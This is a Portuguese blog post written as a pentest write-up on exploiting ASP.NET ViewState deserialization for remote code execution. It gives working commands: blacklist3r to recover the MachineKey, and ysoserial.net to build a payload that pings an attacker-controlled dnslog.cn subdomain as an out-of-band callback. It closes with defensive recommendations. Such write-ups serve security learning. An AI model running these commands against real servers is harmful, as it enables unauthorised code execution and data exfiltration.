---
layout: post
lang: pt
title: ViewState Deserialization To RCE
author: "A$PX"
banner: viewstatedeser.png
description: "Exploitando VIEWSTATES e conseguindo um RCE OOB"
author: A$PX
author_nickname: A$PX
---

```
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣶⣾⣿⣶⣦⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢘⣿⣿⣿⣿⣿⣿⣿⣷⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣴⣿⣿⣿⣿⣌⠙⣿⣿⣿⣤⣀⣀⣀⣴⣿⣿⣦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠠⢴⣶⣿⣿⣿⣿⣿⣿⣮⣻⣤⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣶⣦⣄⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣤⣀⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⣠⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡛⠛⠻⢿⣿⣿⣿⣿⣿⣿⣿⣷⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⢈⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⣿⣿⣷⣶⣤⣴⣿⣿⣿⣿⣋⣽⣿⣿⣿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⣠⣤⣶⣿⣿⣿⣿⣿⣿⣿⣿⠟⢋⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡜⠻⣿⣿⣿⣿⣿⣿⣿⣟⣋⣭⣿⣿⣿⣷⣦⣤⣤⣀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠈⣹⣿⣿⣿⣿⣿⣿⣿⣿⡿⠁⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣶⣴⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡶⠶⣤⣀⡀
⠀⠀⣠⣾⣿⣿⣿⣿⣿⣿⣿⣿⡟⠀⠈⢠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢟⣩⣤⣶⣿⣿⣿⣿⣿⣿⣿⣟⢿⣿⣿⣦⣴⣾⣿⡇
⢀⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡖⠀⢠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⣿⠿⣿⡿⢿⣿⣿⣧⣿⣿⣿⣿⣿⡿⠁
⠜⠿⠛⠿⢿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠊⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣟⠉⠀⡁⠀⠘⠀⢹⠁⠀⢹⣿⢿⣿⣿⡟⢻⡿⠀⠀
⠀⠀⠀⠀⠈⢿⣿⣿⣿⣿⣿⣿⡇⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⣿⣿⣿⣿⣋⠁⠀⠀⠉⠉⣸⡤⠤⣀⣸⠀⠀⢸⠁⠀⠉⠈⠀⢸⠀⠀⠀
⠀⠀⠀⠀⠀⠘⣿⣿⣿⣿⣿⣿⣧⣇⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠃⣿⣿⣿⡇⠀⠙⠉⠲⡄⢰⡿⠀⠀⠀⠈⡇⠀⡞⠒⠒⢲⠀⠀⡜⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢻⣿⣿⣿⣿⣿⣿⣿⡄⠀⠹⠉⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡀⣿⣿⣿⣷⡀⠀⠀⠀⢸⣽⣧⡀⠀⠀⠀⢸⡼⠁⠀⠀⢸⢀⡴⠁⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣄⠀⠀⢹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⡸⣿⣿⣍⠉⠒⢄⠀⠘⣧⣤⡈⠒⡶⣆⠀⠀⠀⠀⠀⠈⠉⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣆⡀⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣽⣿⣿⣷⣦⣘⠉⠁⠻⢿⣿⣷⠃⢸⠒⢤⠀⠀⡞⡄⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠸⠈⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣽⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣤⣀⣼⠃⠀⢠⣷⣦⣧⡜⠀⢸⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣤⣾⣿⣿⣿⣿⣠⡎⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⢿⣿⣿⣿⣿⣿⣿⣿⣷⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡏⠀⠀⠈⠉⠛⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠉⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠈⠁⠈⠋⠙⠛⠉⠛⠉⠿⠿⠛⡿⠋⠁⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⡿⠁⠀⠈⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠁⠀⠀⠀⠀⠈⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠿⣿⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⠀- Firewalls dont stop bears⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠛⠿⣿⠟⠻⣿⣿⡿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀=D⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⡿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
```

# Sumário

1. O que é o VIEWSTATE?
2. Introdução.
3. Obtendo a MachineKeys.
4. Preparando o Payload.
5. PoC Exploit.
6. Recomendações.
7. Conclusão.
# 1) O que é o VIEWSTATE?

O ViewState é um mecanismo incorporado na plataforma ASP.NET para persistir elementos da interface do utilizador e outros dados em pedidos sucessivos. Os dados a serem mantidos são serializados pelo servidor e transmitidos através de um campo de formulário oculto. Quando são lançados de volta ao servidor, o parâmetro ViewState é desserializado e os dados são recuperados.

# 2) Introdução!

Estava realizando um pentest em um ambiente real (permitido) para o meu amigo, e acabei me deparando com um servidor web onde utilizava o Framework 'Microsoft ASP.NET'. Neste momento, ao analisar o código-fonte usando o view-source do navegador, percebi que havia os '__VIEWSTATES' e '__VIEWSTATEGENERATOR'. Porém, o que chamou a minha atenção foi que ao atualizar a página eles não se alteravam.

<img src="/assets/img/Pasted image 20230802113354.png">
<img src="/assets/img/Pasted image 20230802113553.png">

Após isso, utilizei a extensão 'ViewStateDecoder'[1], que pode ser utilizada no BurpSuite. Após a instalação da extensão, obtive o valor do ViewState que estava no website e fiz uma decodificação, percebendo que conseguimos decodificar e que o MAC não está habilitado. Isso dificultaria o processo.

<img src="/assets/img/Pasted image 20230802185338.png">

Um dos fatos interessantes deve-se ao fato de que esse ViewState pode ser controlado por qualquer pessoa para desserializar as informações sensíveis nela contidas, ou mesmo passar um ViewState malicioso para o processo de desserialização (isso será demonstrado mais tarde).

# 3) Obtendo a MachineKeys!!!

Vamos utilizar o blacklist3r, que pode ser encontrado nos exemplos do "badsecrets"[2]. Para realizar o BruteForce no ViewState e conseguir a MachineKeys validationkey e descobrir o tipo de validationAlgo, vamos utilizar o comando abaixo. Note que inserimos o ViewState e o ViewStateGenerator que foram obtidos do view-source do website.

```
python3 blacklist3r.py --viewstate /wEPDwUJOTE2MDg4OTExZGQldI9l1U1eHRoGgWNNqx8PZyM3NQ== -g 540E5640
```

Após montarmos o comando a ser utilizado, nós vamos executá-lo... e conseguimos com sucesso a validationkey e o validationAlgo!!! =)

<img src="/assets/img/Pasted image 20230802110656.png">

Obtivemos a validationkey com sucesso e também percebemos que o algoritmo de criptografia é SHA1. Essas informações que obtivemos agora serão muito úteis quando formos preparar o nosso payload!!!

# 4) Preparando o Payload!!!

Agora vamos utilizar o ysoserial.net[3] para gerar um payload serializado. Note que no primeiro parâmetro definimos o tipo de plugin que será usado para o ViewState, em seguida, o tipo de gadget chain e, posteriormente, o comando a ser executado na máquina. Na sequência, incluímos o valor que estava no __ViewStateGenerator, o tipo de algoritmo do validationAlgo e, por fim, a nossa validationKey do MachineKeys.

O comando a ser executado será um PING em um de nossos subdomains gerados no dnslog[4], mas poderíamos ter utilizado outro, como por exemplo o interactsh[5].

O comando final a ser utilizado ficou desta forma:

```
ysoserial.exe -p ViewState -g TypeConfuseDelegate -c "ping qlsqqg.dnslog.cn" --generator=540E5640 --validationalg="SHA1" --validationkey="F9D1A2D3E1D3E2F7B3D9F90FF3965ABDAC304902"
```

Agora vamos executar o nosso comando...

<img src="/assets/img/Pasted image 20230802114402.png">

Pronto! Após executar o nosso comando, já pronto, conseguimos o nosso payload serializado para ser utilizado... vamos para a melhor parte!!! =D
# 5) PoC Exploit

Chegamos na melhor parte... Neste momento, fui em um campo de busca do website localizado na "Home.aspx" e abri o Burp Suite, interceptando o request POST. Alterei o __VIEWSTATE original e coloquei o nosso, que foi gerado no ysoserial.net.

Observação: poderíamos ter simplesmente colocado um **`/Home.aspx?__VIEWSTATES=PAYLOAD-YSOSERIAL`** na URL do website, mas optamos por fazer de um jeito mais "PROFISSIONAL" e evitar algum possível problema que poderia surgir pela falta de outros parâmetros e seus valores.

<img src="/assets/img/Pasted image 20230802222944.png">

Agora vamos no DNSLOG onde o nosso subdomínio foi gerado, mas lembre-se de que no nosso payload o comando a ser executado é um PING no nosso domínio do dnslog... Agora vamos enviar o request!!!

<img src="/assets/img/Pasted image 20230802114816.png">

Observamos que conseguimos executar o comando na máquina que hospeda o webserver, assim conseguindo validar o nosso RCE. O tipo de técnica a ser usada para explorar esse tipo de RCE é o **Out of Band Exploitation (OOB)**.

A técnica Out-Of-Band (OOB) [6] fornece a um atacante uma forma alternativa de confirmar e explorar uma vulnerabilidade que, de outra forma, é "cega". Em uma vulnerabilidade cega, o atacante não obtém o resultado da vulnerabilidade na resposta direta do website vulnerável. As técnicas OOB frequentemente requerem que o servidor vulnerável gere um pedido TCP/UDP/ICMP de saída, o que permitirá ao atacante exfiltrar dados.
# 6) Recomendações

A lista seguinte mostra como defender os riscos deste ataque:

- Certifique-se de que a validação MAC está ativada.
- Se o parâmetro ViewState só for utilizado em uma máquina, certifique-se de que os parâmetros MachineKey estão a ser gerados dinamicamente a cada atualização da pagina por aplicação.
- Encripte quaisquer parâmetros sensíveis, como a secção machineKey no arquivo de configuração (Web.config).
- Todas as chaves de validação ou de desencriptação divulgadas têm de ser geradas de novo.
-  Certifique-se de que as páginas de erro personalizadas estão a ser utilizadas e que os utilizadores não podem ver as mensagens de erros reais causando um path disclosure.

# 7) Conclusão

Vimos como o ViewState pode ser explorado e uma breve explicação sobre a técnica de exploração **Out of Band Exploitation (OOB)**. Deixarei abaixo alguns conteúdos sobre a exploração em ViewStates [7]-[8]-[9]. Bom, estamos no fim deste paper, espero que tenham gostado realmente. Se tiverem qualquer dúvida, estou disposto a ajudar; basta entrar em contato comigo.

Obrigado por ler até aqui e até a próxima! =)

```
⠀⠀⠀⢰⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠘⡇⠀⠀⠀⢠⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⢷⠀⢠⢣⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⢘⣷⢸⣾⣇⣶⣦⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⣿⣿⣿⣹⣿⣿⣷⣿⣆⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⢼⡇⣿⣿⣽⣶⣶⣯⣭⣷⣶⣿⣿⣶⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠸⠣⢿⣿⣿⣿⣿⡿⣛⣭⣭⣭⡙⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀eat
⠀⠀⠀⠀⠀⠀⠀⠸⣿⣿⣿⣿⣿⠿⠿⠿⢯⡛⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀evade
⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⣿⣿⣿⣾⣿⡿⡷⢿⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀sleep
⠀⠀⠀⠀⠀⠀⠀⡔⣺⣿⣿⣽⡿⣿⣿⣿⣟⡳⠦⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀repeat
⠀⠀⠀⠀⠀⠀⢠⣭⣾⣿⠃⣿⡇⣿⣿⡷⢾⣭⡓⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⣾⣿⡿⠷⣿⣿⡇⣿⣿⣟⣻⠶⣭⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⣋⣵⣞⣭⣮⢿⣧⣝⣛⡛⠿⢿⣦⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⣀⣀⣠⣶⣿⣿⣿⣿⡿⠟⣼⣿⡿⣟⣿⡇⠀⠙⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⡼⣿⣿⣿⢟⣿⣿⣿⣷⡿⠿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠉⠁⠀⢉⣭⣭⣽⣯⣿⣿⢿⣫⣮⣅⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⢀⣿⣟⣽⣿⣿⣿⣿⣾⣿⣿⣯⡛⠻⢷⣶⣤⣄⡀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⢀⡞⣾⣿⣿⣿⣿⡟⣿⣿⣽⣿⣿⡿⠀⠀⠀⠈⠙⠛⠿⣶⣤⣄⡀⠀⠀
⠀⠀⠀⣾⣸⣿⣿⣷⣿⣿⢧⣿⣿⣿⣿⣿⣷⠁⠀⠀⠀⠀⠀⠀⠀⠈⠙⠻⢷⣦
⠀⠀⠀⡿⣛⣛⣛⣛⣿⣿⣸⣿⣿⣿⣻⣿⣿⠆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⢸⡇⣿⣿⣿⣿⣿⡏⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⢰⣶⣶⣶⣾⣿⢃⣿⣿⣿⣿⣯⣿⣭⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
```

- <a href="https://github.com/raise-isayan/ViewStateDecoder/tree/master/release">[1] https://github.com/raise-isayan/ViewStateDecoder/tree/master/release</a>
- <a href="https://github.com/blacklanternsecurity/badsecrets">[2] https://github.com/blacklanternsecurity/badsecrets</a>
- <a href="https://github.com/pwntester/ysoserial.net/">[3] https://github.com/pwntester/ysoserial.net/</a>
- <a href="http://dnslog.cn/">[4] http://dnslog.cn/</a>
- <a href="https://app.interactsh.com/">[5] https://app.interactsh.com/</a>
- <a href="https://notsosecure.com/out-band-exploitation-oob-cheatsheet">[6] https://notsosecure.com/out-band-exploitation-oob-cheatsheet</a>
- <a href="https://soroush.me/blog/2019/04/exploiting-deserialisation-in-asp-net-via-viewstate/">[7] https://soroush.me/blog/2019/04/exploiting-deserialisation-in-asp-net-via-viewstate/</a>
- <a href="https://github.com/Y4er/dotnet-deserialization/blob/main/ViewState.md">[8] https://github.com/Y4er/dotnet-deserialization/blob/main/ViewState.md</a>
- <a href="https://notsosecure.com/exploiting-viewstate-deserialization-using-blacklist3r-and-ysoserial-net">[9] https://notsosecure.com/exploiting-viewstate-deserialization-using-blacklist3r-and-ysoserial-net</a>
